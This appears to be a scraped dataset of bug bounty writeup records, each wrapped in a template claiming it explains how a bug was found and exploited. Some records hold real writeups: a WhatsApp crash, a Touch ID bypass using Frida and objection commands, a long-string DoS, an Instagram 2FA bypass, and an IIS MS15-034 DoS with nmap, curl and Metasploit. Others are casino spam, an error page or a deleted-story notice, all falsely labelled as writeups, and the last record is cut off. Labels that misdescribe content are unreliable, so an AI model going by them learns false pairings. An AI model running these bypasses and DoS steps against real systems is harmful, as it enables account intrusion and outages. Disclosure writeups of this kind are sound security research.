{"source_url": "https://medium.com/@pratheesh.p.narayanan/whatsapp-dos-vulnerability-on-android-ios-web-7628077d21d4", "title": "Whatsapp- DOS vulnerability on Android/iOS/Web | by Pratheesh P Narayanan | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@pratheesh.p.narayanan/whatsapp-dos-vulnerability-on-android-ios-web-7628077d21d4. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nWhatsapp- DOS vulnerability on Android/iOS/Web | by Pratheesh P Narayanan | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Whatsapp- DOS vulnerability on Android/iOS/Web Pratheesh P Narayanan 3 min read · May 15, 2018 -- 2 Listen Share Hi Friends :) Just writing this post to share my first experience on Bug Hunting.. Happy to say that I’ve received my first bounty right from Facebook which is considered to be a Tough Platform to get rewarded… Intro…. Myself Pratheesh P Narayanan, I’m pursuing B.tech (CSE) from one of the prestigious institutions in my State (Kerala,India).During my childhood days I had a passion towards computers and other elecronic gadgets. Well,it was my Father who gave me an exposure to the Digital Field. He was always there with me ,he was the first one to understand my passion. Even though i was pretty average on my academics, my Mother knew my passion and stood with me all these years… She motivated me to go for Btech regardless of my poor academic performance -_- I’m not really a Bug hunter or a Whitehat. But I do love Technology and i tried my own ways to break the security of different websites/apps from time to time ;). I had previously reported some Bugs on Google and was awarded with their Hall Of Fame (currently Page 5). About The Bug…. The attacker sends the malicious payload to the victim as a contact. Please note that the payload is embedded within the contact and no way the victim is aware of it. As soon as the payload gets delivered to the victim,his phone immediately crashes. PAYLOAD: // removed[THIS IS AN ANDROID FRAMEWORK ISSUE AND I CANNOT SHARE THE PAYLOAD UNTIL GOOGLE ISSUES A FIX] // NB: The issue is fixed and you need not try using the payload again ;) All i did was embed the Payload on a contact file along with long list of emoticon’s . As soon as the payload is delivered to the victim, the phone displays a notification on the victims phone. As soon as the payload is delivered, the victims phone is crashed. The contact can be send N times to increase the severity of the crash. I was in deep trouble making the Facebook team understand about my bug.Though I had sent Video POC and detailed instructions, they could never reproduce my bug. So I asked them to message me on Whatsapp so that i could sent them the payload. And as Expected, they did message me and i could crash the test device of the Facebook Security Team :) Chat With Facebook Team And it was not enough, i had to reproduce the issue with the Whatsapp Security Team as well, and yeah i did :) Whatsapp Security Team After almost 2 months of waiting,they finally fixed it and rewarded me with $500 and my name was added to Hall Of Fame This is all about my experience on my first bug bounty.I hope I can come up with more Reports in the future.Thanks for your valuable time in reading by Story :) Also, I extend my Gratitude to ABHISHEK SIDHARTH for helping me create this report. See you soon Wanna contact me? Twitter: @PRATHEESH_PPN Telegram: https://t.me/Al3n890 Regards Pratheesh P Narayanan Security WhatsApp Bug Bounty Unlisted -- -- 2 Written by Pratheesh P Narayanan 57 followers · 0 following Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@pig.wig45/touch-id-authentication-bypass-on-evernote-and-dropbox-ios-apps-7985219767b2", "title": "Touch ID Authentication Bypass on Evernote and Dropbox IOS Apps | by Sahil Tikoo | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@pig.wig45/touch-id-authentication-bypass-on-evernote-and-dropbox-ios-apps-7985219767b2. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nTouch ID Authentication Bypass on Evernote and Dropbox IOS Apps | by Sahil Tikoo | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Touch ID Authentication Bypass on Evernote and Dropbox IOS Apps Sahil Tikoo 6 min read · Apr 3, 2020 -- 2 Listen Share This blog will walk you through the technique that I used to bypass Touch ID authentication feature implemented on the Login Page in Evernote and Dropbox IOS apps. Just Before Getting Started, I will list down the tools that were used in this process: Iphone 6S with ios 13.3.1 Checkra1n executable for semi tethered Jailbreaking Frida on PC & frida server on device Objection on PC Lets get started folks!! Prologue Jailbreaking ios 13.3.1: First and foremost install checkra1n executable on your PC in my case I had mac OS , you can install the dmg from here https://checkra.in/#release and continue with the entire process of jailbreaking until your device reboots , finally you will be presented with a checkra1n IPA through which cydia and other custom apps can be installed. Jailbroken Iphone 6S with ios 13.3.1 You can refer this blog for the entire Jailbreak process: https://www.redmondpie.com/jailbreak-ios-13.3.1-using-checkra1n-heres-how-guide/ . Once you have a jailbroken device the next step in the process is to install frida server through cydia(a store to download all the apps). Frida server on Iphone 6S Finally Install frida and objection on Your PC in my case I had mac OS, you can install Objection from https://github.com/sensepost/objection/wiki and frida will get automatically installed , you just need to have python3 installed. Methodology Once you have all the tools necessary to test Touch ID feature implemented in the apps , the roadmap is clear and pretty straightforward.Install Evernote and Dropbox apps from the App store and interact with these apps through frida server and objection.Finally Bypass authentication by utilizing commands available in objection. Pre Configuration before Attack Install Evernote and Dropbox apps from the app store , once installed also check if frida and objection are working perfectly or not on your PC .Let us enable TouchID’s for both the apps now. Setting up Touch ID in Evernote Steps: Go to your profile Go to settings Click on passcode Lock Click `Turn Passcode On` Setup the passcode and once its done TouchID will be automatically enabled. Evernote Touch ID enabled Setting up Touch ID in Dropbox Steps: Go to your profile Click on the settings logo on the top left corner Click `Turn Passcode On` Setup the passcode and once its done slide the TouchID button. Dropbox Touch ID enabled Understanding the Attack Let us confirm whether TouchID’s are working or not, after configuring Touch ID for both the apps , close the apps and open them again, if you are presented with a banner like Touch ID for “Evernote” or Touch ID for “Dropbox” then you are good to go. But…. Before we begin the actual attack Lets Understand the bypass first. Note: I will just briefly give you an idea about how it was actually bypassed and then we begin with the practical demo. Basically when a User puts his/her fingerprint for the TouchID auth then a class LAContext is invoked in the application code which in turn calls the evaluatePolicy method , inside this method fingerprint data in the form of a mathematical expression is checked against the fingerprint data stored in Secure Enclave of the device.Depending on the success or failure of the authentication itself, a reply block is invoked that includes a boolean indicating if it was successful or not. So if the auth was successful we get a boolean true else a boolean false return value.We use a command ios ui biometrics_bypass in objection tool for bypassing this boolean value check , after using this command, objection starts interacting with frida server on the device.Frida server during runtime, changes the false value to true , gives heads up to objection and bang we get access. Note: Checkout the entire description about this command and how it works https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass in this post. Final Attack Lets Begin the demo for bypass now.We will go step by step so its easy to understand.The bypassing techniques used in both Dropbox and Evernote are same as described above.So, the steps would remain the same, i will be just adding two different Image POC’s to make it clear that bypass is present on both the apps. Steps: Connect your Iphone with the PC First we need to identify under what names apps are running on the phone. Run frida-ps -U on your PC terminal Press enter or click to view image in full size Frida command on PC terminal 4. The apps are usually running by their own names “Evernote” and “Dropbox” as you can see in the above Image. 5. Open the Evernote App 6. Next step is to run objection with the commands like: objection -g Evernote explore Press enter or click to view image in full size Objection command Evernote 7. Now use ios ui biometrics_bypass command as shown below along with that you can also observe a localized reason in the Image was identified by the agent or we can say frida server, Sometimes frida server or the agent isn’t able to identify the touchID pop up while opening the app and you won’t see the localized reason message in objection so make sure to lock the phone without closing the app and again unlock it quickly to observe that the code was hooked properly. Press enter or click to view image in full size biometric bypass command [Evernote] 8. As you can see below wrong fingerprint attempts were made on the Touch ID , it might sometimes take three attempts to bypass , make sure while making the attempts objection is running in terminal and device is connected with a USB cable. Evernote fingerprint wrong attempts 9. So finally during the 3rd wrong attempt , below are the results on both objection terminal and app GUI as well: Press enter or click to view image in full size Bypass Complete on Evernote app 10. As you can see in the image below , Evernote dashboard accessed by bypassing the fingerprint auth mechanism. Evernote dashboard accessible Similarly for Dropbox as well follow all the steps from step5 to step9.Finally during the 3rd wrong attempt in the case of dropbox as well , below are the results observed on both objection terminal and app GUI : Press enter or click to view image in full size Bypass Complete on Dropbox app Dropbox dashboard also accessible after bypassing the fingerprint auth mechanism. Dropbox dashboard accessible Note:Just let me know through DM on my twitter handle https://twitter.com/viperbluff how this Vulnerability can be patched :-) Hope u guys liked it !! Pentesting IOS Apps Security Bug Bounty Mobile App Testing -- -- 2 Written by Sahil Tikoo 165 followers · 2 following Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.mohamedharon.com/2018/09/subdomain-takeover-via-campaignmonitor.html", "title": "Украинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы", "friendly_explanation": "This is a bug bounty writeup from https://www.mohamedharon.com/2018/09/subdomain-takeover-via-campaignmonitor.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nУкраинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы mohamedharon.com Меню Украинские казино онлайн Украинские казино онлайн Онлайн-казино в Украине становятся всё популярнее, и мы не можем не заметить, как быстро этот рынок развивается. С каждым годом появляется всё больше платформ, предлагающих захватывающие игры, щедрые бонусы и удобные способы оплаты. Это отличный способ провести время, испытать удачу и, возможно, сорвать крупный выигрыш. Мы понимаем, что выбор среди множества онлайн-казино может быть непростым. Ведь хочется, чтобы всё было честно, безопасно и увлекательно. Давайте разберёмся, как найти лучшее украинское казино онлайн, на что обратить внимание и какие возможности ждут нас в этом захватывающем мире азартных игр. Лучшие украинские казино онлайн Онлайн-казино в Украине предлагают игрокам широкий выбор качественных платформ. Мы рассмотрим популярные варианты и критерии, которые помогут найти надежное место для игры. Популярные платформы в 2025 году Украинские онлайн-казино уверенно выходят на международный рынок и становятся всё более популярными среди игроков в Эстонии. Они привлекают не только широким выбором игр, но и выгодными условиями для новичков: моментальная регистрация, щедрые приветственные бонусы, ежедневные акции и бесплатные фриспины. Parimatch Casino Быстрая регистрация через электронную почту или социальные сети. Фриспины начисляются после первого депозита. Казино предлагает ежедневные бонусы, кэшбэк и программу лояльности для активных игроков. Favbet Casino Упрощённый процесс создания аккаунта и регулярные турниры. Новые пользователи получают фриспины после подтверждения аккаунта. Бонусная система обновляется постоянно, предлагая свежие акции и розыгрыши. Cosmolot Casino Регистрация занимает менее минуты. Платформа предлагает ежедневные фриспины, бонусы за активность, кэшбэк и адаптивный мобильный интерфейс. Программа лояльности настраивается под индивидуальный стиль игры. Slotoking Casino Бездепозитные фриспины сразу после регистрации и быстрый старт. Казино предлагает регулярные акции, обновление игровых автоматов и оперативное выведение выигрышей — именно это ценят игроки в Эстонии. First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям. Мы уверены, что осознанный подход к выбору казино и соблюдение простых рекомендаций помогут вам наслаждаться игрой, избегая неприятных ситуаций. Не забывайте об ответственности и играйте для удовольствия, а не ради риска. Пусть ваш опыт в украинских онлайн-казино будет захватывающим, а удача всегда на вашей стороне! Часто задаваемые вопросы Какие критерии важны при выборе онлайн-казино в Украине? Для выбора надежного онлайн-казино обратите внимание на наличие лицензии, разнообразие игр, методы оплаты, бонусные программы, репутацию и отзывчивость технической поддержки. Проверка этих параметров гарантирует честность, безопасность и комфортный игровой опыт. Какие казино популярны в Украине в 2023 году? Особой популярностью пользуются Cosmolot, Parimatch, JacobCasino и Slotoking. Эти платформы предлагают широкий выбор игр, бонусы и удобный пользовательский интерфейс. Какие способы оплаты доступны в украинских онлайн-казино? Часто используются Visa, Mastercard, Monobank, Приват24, Qiwi, криптовалюты (Bitcoin, Ethereum) и мобильные платежи. Время зачисления депозита обычно мгновенное, а вывод средств может занять от 1 до 3 рабочих дней. Насколько безопасны игры в онлайн-казино? Безопасность обеспечивается лицензированием, шифрованием данных и честными системами генерации случайных чисел. Игрокам рекомендуется выбирать только лицензированные платформы. Какие бонусы можно получить в украинских онлайн-казино? Бонусы включают приветственные пакеты, бесплатные вращения, кешбэк и программы лояльности. Эти акционные предложения увеличивают шансы на выигрыш. Какие риски связаны с игрой в онлайн-казино? Основные риски — это финансовые потери, игровая зависимость и технические проблемы. Для минимизации рисков важно играть осознанно и придерживаться установленного бюджета. Можно ли играть в украинских казино на мобильных устройствах? Да, большинство онлайн-казино предлагают мобильные приложения или адаптированные версии сайта, что позволяет играть в любое время и в любом месте. Как быстро проходят финансовые транзакции в казино? Депозиты обычно зачисляются мгновенно, а вывод средств может занимать от нескольких часов до 3 рабочих дней в зависимости от метода платежа. Как проверить легальность онлайн-казино в Украине? Убедитесь, что казино имеет лицензию от КРАИЛ (Комиссии по регулированию азартных игр и лотерей). Информация о лицензии должна быть указана на официальном сайте казино. Какие ошибки новички допускают при игре в онлайн-казино? Частые ошибки — игнорирование лицензии, ставка больше установленного бюджета, отсутствие стратегии и эмоциональные решения. Избегайте этих ошибок для улучшения игрового опыта. Copyright © 2025 - all rights reserved by mohamedharon.com Прокрутка вверх"}
{"source_url": "https://gauravnarwani.com/two-factor-authentication-bypass/", "title": "Not Acceptable!", "friendly_explanation": "This is a bug bounty writeup from https://gauravnarwani.com/two-factor-authentication-bypass/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nNot Acceptable! Not Acceptable! An appropriate representation of the requested resource could not be found on this server. This error was generated by Mod_Security."}
{"source_url": "https://medium.com/@shahjerry33/long-string-dos-6ba8ceab3aa0", "title": "Long String DoS. Summary : By sending a very long string… | by Jerry Shah (Jerry) | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@shahjerry33/long-string-dos-6ba8ceab3aa0. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nLong String DoS. Summary : By sending a very long string… | by Jerry Shah (Jerry) | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Long String DoS Jerry Shah (Jerry) 3 min read · Feb 26, 2020 -- 2 Listen Share Summary : By sending a very long string (100000 characters) it’s possible to cause a denial a service attack on the server. This may lead to the website becoming unavailable or unresponsive. Usually this problem is caused by a vulnerable string hashing implementation. When a long string is sent, the string hashing process will result in CPU and memory exhaustion. This vulnerability was detected by sending strings with various lengths and comparing the measured response times. I found this vulnerability on one of the private program on HackerOne. I found it while creating an account, I used the long password string for testing this vulnerability and I got 500 Internal Server Error. So it was confirmed that it is vulnerable. Now here the minor concern is people always try to find this vulnerability on password function as I did, but you can find this at many places like : Username Firstname or Lastname Email Address (create your own email using temp-mail) Address Text-Area Comment Section and many more..!! I would like to give an example that why username ? Say for example I’m using any social media website and I have created 2 accounts for testing purpose. Now in account A ‘s username I have entered a long string of 1000 characters and I’m searching for account A from account B then 2 things can be happen : Either it will keeping on searching for long time Either the application will crash (500 - Error Code) How I found this vulnerability : Go to https://privateprogram.com/signup Fill the form and enter a long string in password Press enter or click to view image in full size Long String 3. Click on enter and you’ll get 500 Internal Server error if it is vulnerable Press enter or click to view image in full size Server Crash Now many a times it happens that the signup page is not vulnerable to Long String Dos so you can try it while resetting your password. Press enter or click to view image in full size Resetting Password using Long String I found it on resetting password and got successful, so I reported to the company and the gave me bounty of 100$ Press enter or click to view image in full size NOTE : This DoS attack falls under the Application Level DoS and not Network Level DoS so you can report it. In some company’s policy of Out-Of-Scope, you’ll find “Denial of Service” which means Network Level DoS and not Application Level DoS. If the company has stated that “Any kind of DoS” is Out-Of-Scope that means you can’t report either of them. Thank You :) Instagram : jerry._.3 Bug Bounty Hall Of Fame Vulnerability -- -- 2 Written by Jerry Shah (Jerry) 5K followers · 5 following OSCP+ | OSCP | CRTP | eWPTXv2 | PNPT | CRTSv2 | CRTA | eJPTv2 | MCRTA | CRT-COI | CAP | CNSP | C3SA Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@_bl4de/authentication-bypass-in-nodejs-application-a-bug-bounty-story-d34960256402", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@_bl4de/authentication-bypass-in-nodejs-application-a-bug-bounty-story-d34960256402. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://medium.com/@vishnu0002/instagram-multi-factor-authentication-bypass-924d963325a1", "title": "Instagram Multi-factor authentication Bypass | by vishnuraj | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@vishnu0002/instagram-multi-factor-authentication-bypass-924d963325a1. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nInstagram Multi-factor authentication Bypass | by vishnuraj | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Instagram Multi-factor authentication Bypass vishnuraj 2 min read · Nov 27, 2018 -- 5 Listen Share Hi , This post is regarding one of my findings in Facebook, which could have allowed anyone to bypass Multi-factor authentication. Vulnerability Type : Privilege Escalation/bypass authorization Product Area: Instagram Description Two-factor authentication is a security mechanism that requires two types of credentials for authentication and is designed to provide an additional layer of validation, minimizing security breaches. Impact Two-factor authentication can be bypassed using the add instagram account feature in facebook business . While merging the victim account with the attacker facebook account, 2FA of victim account gets automatically bypassed which an attacker use 2fa enabled victim account without entering 2FA process. Proof of Concept 1) User “A” creates a business account and Adds victim Two-factor authentication enabled account. Press enter or click to view image in full size 2) add victim username and password (2FA enabled account) Press enter or click to view image in full size 3) here you can see 2FA check skipped when a Business Manager tries to link an Instagram Account I would like to thanks Facebook Security Team for this awesome Response . Press enter or click to view image in full size Thanks again! Have a great day ahead ☺ Security Bug Bounty Infosec Responsible Disclosure Cybersecurity -- -- 5 Written by vishnuraj 711 followers · 74 following | OSCP | OSWE | eWPTXv2 | https://bugcrowd.com/vishnuraj Responses ( 5 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/bugbountywriteup/banner-grabbing-to-dos-and-memory-corruption-2442b1c25bbb", "title": "Banner Grabbing to DoS and Memory Corruption | by Daniel \"V\" Morais | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/banner-grabbing-to-dos-and-memory-corruption-2442b1c25bbb. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nBanner Grabbing to DoS and Memory Corruption | by Daniel \"V\" Morais | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Banner Grabbing to DoS and Memory Corruption Daniel \"V\" Morais 5 min read · Apr 16, 2019 -- Listen Share Hello friends, Sorry for my absence, I’ve been working hard these days but here I am, making my contribution to our community. Today’s topic is about a flaw that I encountered in a company I ran the Pentest privately, where I found an IIS server among its various * .subdomains.com. This specific one had two CVE’s. What I found interesting to share was that at the beginning of my bug bounty journey, I used to report low ‘hanging fruits’ without even trying to exploit them, e.g, banner grabbing. Press enter or click to view image in full size As you can see in the image above, often the banner grabbing itself will be considered low impact and your report will most likely be closed as informative. As time goes by, you get more knowledge, your methodology changes, and you start to improve the way you look at your target, having said that, let’s start: Banner grabbing and bug bounty Banner grabbing is a process to collect details regarding any remote PC on a network and the services running on its open ports. An attacker can make use of banner grabbing in order to discover network hosts and running services with their versions on their open ports and moreover operating systems so that he can exploit it. To make a significant impact on that, check the list of active hosts with the banner displayed, write them down, and start looking for the vulns of the versions. Something simple, but little practiced by beginners, who usually report the low impact vuln without wanting to deepen it enough to become critical. From banner grabbing to DoS and memory corruption I will show you the step by step that I made to transform a banner grabbing in DoS and memory corruption, using only the exploits spread on the internet. The company (which did not allow to be identified then let’s call redacted) had several subdomains, and many of them with their banner exposed, including on ports like ssh, ftp, but my focus will be on port 80 (http), where they did use of a internal ticket system. Discovery: I used the following nmap command to check for banners that could help me in the next approach of the target nmap -Pn -p 80, 443 -sV — script=banner -iL all_subdomains.txt Press enter or click to view image in full size For users who do not want to use nmap, this check could be done by CURL: curl -s -I 192.168.0.100 | grep -e “Server: “ Press enter or click to view image in full size The redacted company allowed DoS in its scope, since I was working locally for it, it was easy to get in touch with the infrastructure team to report on some critical flaw in that regard. Keeping in mind the IIS servers, in a quick search I found exploits to perform DoS on microsoft servers (MS15–034) to not be extensive, you can read more about the vuln here . Detecting the vulnerability: The vulnerability can be triggered by specifying the Range header in an HTTP request. A vulnerable install will respond with an HTTP 416 Requested Range Not Satisfiable error. Press enter or click to view image in full size Am I really getting this error? Great! Following the tutorial of the link above, I had just to specify the valid file and the byte range of 100 and as a result it lead me to a blue screen, it means … DoS! Press enter or click to view image in full size Remember , when dealing with DoS in a bounty bug, check if this type of vuln is allowed, if it’s not and still you find it relevant, communicate the team properly, what I did above was accompanied by the responsible team from the company. Sometimes the same version may have more than one critical vulnerability, which was the case with this IIS server, had previously read that it was possible to run memory dump, let’s see how the result was: Wait, Memory dump? Anything that lets you corrupt the memory on a server has the potential of a remote code execution. At least, it lets you crash processes or the operating system. We have a metasploit module for this IIS vuln (always check there using search options) Setting metasploit module Press enter or click to view image in full size Response: The screen is beautiful but … no “critical” data at the time I performed the dump, regardless of that, the vulnerability was successfully confirmed, which was enough :) Metasploit memory dump module for IIS link here . Takeaways: As you have been able to observe, I have tried to focus more on the beginner community, showing how to look in a different way for those low impact vulns that are very common to find. I hope I have contributed in a way, just as I learn from all of you. Happy Hacking! Hope you liked it, now I have a twitter so we can share knowledge there also. Find me here . Hacker Cybersecurity Technology Web Development Bug Bounty -- -- Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Daniel \"V\" Morais 451 followers · 19 following Penetration tester & Ethical Hacker - https://vsec.com.br - - https://danielv.com.br Vendetta Team. No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.mohamedharon.com/2019/02/souqcom-subdomain-takeover-via.html", "title": "Украинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы", "friendly_explanation": "This is a bug bounty writeup from https://www.mohamedharon.com/2019/02/souqcom-subdomain-takeover-via.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nУкраинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы mohamedharon.com Меню Украинские казино онлайн Украинские казино онлайн Онлайн-казино в Украине становятся всё популярнее, и мы не можем не заметить, как быстро этот рынок развивается. С каждым годом появляется всё больше платформ, предлагающих захватывающие игры, щедрые бонусы и удобные способы оплаты. Это отличный способ провести время, испытать удачу и, возможно, сорвать крупный выигрыш. Мы понимаем, что выбор среди множества онлайн-казино может быть непростым. Ведь хочется, чтобы всё было честно, безопасно и увлекательно. Давайте разберёмся, как найти лучшее украинское казино онлайн, на что обратить внимание и какие возможности ждут нас в этом захватывающем мире азартных игр. Лучшие украинские казино онлайн Онлайн-казино в Украине предлагают игрокам широкий выбор качественных платформ. Мы рассмотрим популярные варианты и критерии, которые помогут найти надежное место для игры. Популярные платформы в 2025 году Украинские онлайн-казино уверенно выходят на международный рынок и становятся всё более популярными среди игроков в Эстонии. Они привлекают не только широким выбором игр, но и выгодными условиями для новичков: моментальная регистрация, щедрые приветственные бонусы, ежедневные акции и бесплатные фриспины. Parimatch Casino Быстрая регистрация через электронную почту или социальные сети. Фриспины начисляются после первого депозита. Казино предлагает ежедневные бонусы, кэшбэк и программу лояльности для активных игроков. Favbet Casino Упрощённый процесс создания аккаунта и регулярные турниры. Новые пользователи получают фриспины после подтверждения аккаунта. Бонусная система обновляется постоянно, предлагая свежие акции и розыгрыши. Cosmolot Casino Регистрация занимает менее минуты. Платформа предлагает ежедневные фриспины, бонусы за активность, кэшбэк и адаптивный мобильный интерфейс. Программа лояльности настраивается под индивидуальный стиль игры. Slotoking Casino Бездепозитные фриспины сразу после регистрации и быстрый старт. Казино 